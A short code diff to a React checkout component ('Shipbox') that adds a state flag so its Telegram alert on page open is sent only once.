@@ -18,12 +18,16 @@ const Shipbox = () => {
     country: ""
   });
   const [isSubmitting, setIsSubmitting] = useState(false);
+  const [alertSent, setAlertSent] = useState(false);
 
   // Send Telegram alert when user opens checkout page
   useEffect(() => {
-    console.log('[Shipbox] Component mounted, sending Telegram alert...');
-    sendCheckoutPageAlert();
-  }, []);
+    if (!alertSent) {
+      console.log('[Shipbox] Component mounted, sending Telegram alert...');
+      sendCheckoutPageAlert();
+      setAlertSent(true);
+    }
+  }, [alertSent]);
 
   const handleChange = (e) => {
     setFormData({
